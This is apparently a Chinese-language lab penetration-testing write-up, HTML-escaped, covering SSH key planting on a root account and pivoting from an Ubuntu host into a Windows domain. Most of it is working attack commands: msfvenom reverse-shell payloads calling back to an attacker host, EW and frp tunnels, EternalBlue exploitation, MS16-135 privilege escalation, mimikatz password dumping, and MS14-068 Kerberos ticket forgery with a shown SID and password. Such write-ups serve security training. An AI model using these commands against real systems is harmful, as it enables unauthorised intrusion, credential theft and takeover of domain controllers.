&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. linux&lt;br&gt;看 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/cron这个文件就可以，可以用tail -f /&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/log/&lt;/span&gt;cron观察（或者&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/cron.log）&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. unix&lt;br&gt;在 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/cron/&lt;/span&gt;tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. mail任务&lt;br&gt;在 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root 文件中，有crontab执行日志的记录，用tail -f &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root 即可查看最近的crontab执行情况&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;尝试写ssh公钥来连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试写ssh公钥来连接&#34;&gt;#&lt;/a&gt; 尝试写.ssh 公钥来连接&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;本地生成公私钥&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;ssh&lt;/span&gt;-keygen -f m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;600&lt;/span&gt; m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 m1n.pub 文件上传到服务器的 &lt;code&gt;/root/.ssh/&lt;/code&gt;  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 m1n.pub 的文件内容写到 authorized_keys 文件中 &lt;code&gt;cat m1n.pub &amp;gt; authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后 &lt;code&gt;ssh -i m1n root@ip&lt;/code&gt;  连接，即可&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;踩坑笔记：不要写公钥到 &lt;code&gt;/home/ubuntu/.ssh/&lt;/code&gt;  目录下，连不上。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;内网渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内网渗透&#34;&gt;#&lt;/a&gt; 内网渗透&lt;/h2&gt;
&lt;h3 id=&#34;传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传&#34;&gt;#&lt;/a&gt; 传🐎&lt;/h3&gt;
&lt;h4 id=&#34;msf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; MSF🐎&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;生成 msf🐎&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &amp;gt; mshell.elf&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把🐎儿传到目标机子上面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击机执行以下&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;use exploit/multi/handler&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; payload linux/x64/meterpreter/reverse_tcp&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lhost 10.192.168.145&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lport 4444&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目标机器添加权限后执行 mshell.elf&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;kali 接收到 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;background&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;post&lt;/span&gt;/multi/manage/autoroute&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; session x&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;代理转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理转发&#34;&gt;#&lt;/a&gt; 代理转发&lt;/h3&gt;
&lt;h4 id=&#34;使用ew代理转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用ew代理转发&#34;&gt;#&lt;/a&gt; 使用 ew 代理转发&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;上传 ew_for_linux64&lt;/li&gt;
&lt;li&gt;执行 &lt;code&gt;./ew -s ssocksd -l 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot&lt;/li&gt;
&lt;li&gt;在需要代理时，执行命令如 &lt;code&gt;proxychains4 curl http://127.0.0.1:2003/&lt;/code&gt;  即可&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ubuntu信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ubuntu信息收集&#34;&gt;#&lt;/a&gt; Ubuntu 信息收集&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msf 进行一波存活扫描&lt;/p&gt;
&lt;figure class=&#34;highlight gams&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gams&#34;&gt;use auxiliary/scanner/discovery/udp_probe&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; rhosts &lt;span class=&#34;hljs-comment&#34;&gt;192.168.183.0-255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;threads 5&lt;/span&gt;&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到有 128、130 两台机子。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扫一下 ms17-010&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/smb/smb_ms&lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;_&lt;span class=&#34;hljs-number&#34;&gt;010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;set&lt;/span&gt; rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.128&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。&lt;/p&gt;
&lt;figure class=&#34;highlight gams&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gams&#34;&gt;setg Proxies socks5:&lt;span class=&#34;hljs-number&#34;&gt;10.0&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.5&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.100&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8888&lt;/span&gt;					&lt;span class=&#34;hljs-comment&#34;&gt;//MSF走ew的代理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; ReverseAllowProxy &lt;span class=&#34;hljs-comment&#34;&gt;true&lt;/span&gt;							//开启反向代理&lt;br&gt;use &lt;span class=&#34;hljs-comment&#34;&gt;exploit&lt;/span&gt;/windows/&lt;span class=&#34;hljs-comment&#34;&gt;smb&lt;/span&gt;/ms17_010_eternalblue&lt;br&gt;set payload windows/&lt;span class=&#34;hljs-comment&#34;&gt;x64&lt;/span&gt;/meterpreter/&lt;span class=&#34;hljs-comment&#34;&gt;bind_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;rhost 192.168.183.128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;AutoRunScript post&lt;/span&gt;/windows/&lt;span class=&#34;hljs-comment&#34;&gt;manage&lt;/span&gt;/migrate       &lt;span class=&#34;hljs-comment&#34;&gt;//自动迁移进程&lt;/span&gt;&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功拿下 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7权限维持&#34;&gt;#&lt;/a&gt; Win7 权限维持&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拿 ubuntu 当作跳板机，把 frps 传到 ubuntu 上，不修改配置，直接执行 &lt;code&gt;./frps -c ./frps.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png&#34; alt=&#34;image-20211112170138230&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 frpc 上传到自己的 CS 服务器，修改 frpc.ini 后启动 frpc： &lt;code&gt;./frpc -c ./frpc.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png&#34; alt=&#34;image-20211112170249583&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CS 创建一个 ip 为 ubuntu 的监听器&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png&#34; alt=&#34;image-20211112170412976&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;生成马传到 win7 上执行即可上线&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png&#34; alt=&#34;image-20211112170455408&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.128 LPORT=4455 -f exe -o mshell.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7信息收集&#34;&gt;#&lt;/a&gt; Win7 信息收集&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;route print&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png&#34; alt=&#34;image-20211112171015589&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;net user /domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;net user&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;net view&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nslookup WIN-ENS2VR5TR3N&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png&#34; alt=&#34;image-20211112171507481&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7提权&#34;&gt;#&lt;/a&gt; Win7 提权&lt;/h3&gt;
&lt;p&gt;先 systeminfo 拿到补丁列表，使用 http://bugs.hacking8.com/tiquan/ 直接查询可用 exp，发现 MS16-135 可用，直接梼杌 MS16-135 提权一把梭&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png&#34; alt=&#34;image-20211114004439133&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到新 shell，尝试用猕猴桃拿密码&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png&#34; alt=&#34;image-20211114004938173&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mimikatz sekurlsa::logonpasswords&lt;/code&gt;  拿到明文密码&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png&#34; alt=&#34;image-20211114005145157&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;win7打域控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7打域控&#34;&gt;#&lt;/a&gt; Win7 打域控&lt;/h3&gt;
&lt;p&gt;同样的，使用 http://bugs.hacking8.com/tiquan/ 发现可以用 MS14-068，工具：&lt;a href=&#34;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&#34;&gt;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;用收集到的 sid、成员名、密码伪造票据&lt;/p&gt;
&lt;figure class=&#34;highlight subunit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs subunit&#34;&gt;//ms14&lt;span class=&#34;hljs-string&#34;&gt;-068&lt;/span&gt;.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码&lt;br&gt;&lt;br&gt;ms14&lt;span class=&#34;hljs-string&#34;&gt;-068&lt;/span&gt;.exe -u douser@DEMO.com -s S&lt;span class=&#34;hljs-string&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-5&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-21&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-979886063&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-1111900045&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-1414766810&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-1107&lt;/span&gt; -d 192.168.183.130 -p Dotest123&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png&#34; alt=&#34;image-20211114010319666&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;用猕猴桃注入票据&lt;/p&gt;
&lt;figure class=&#34;highlight dts&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;mimikatz kerberos::purge         &lt;span class=&#34;hljs-comment&#34;&gt;//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造&lt;/span&gt;&lt;br&gt;mimikatz kerberos::list          &lt;span class=&#34;hljs-comment&#34;&gt;//查看当前机器凭证&lt;/span&gt;&lt;br&gt;mimikatz kerberos::ptc &lt;span class=&#34;hljs-params&#34;&gt;&amp;lt;生成的票据文件&amp;gt;&lt;/span&gt;   &lt;span class=&#34;hljs-comment&#34;&gt;//将票据注入到内存中&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png&#34; alt=&#34;image-20211114010623765&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试查看域控的 C 盘&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;net&lt;/span&gt; use \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;dir&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N\c$&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
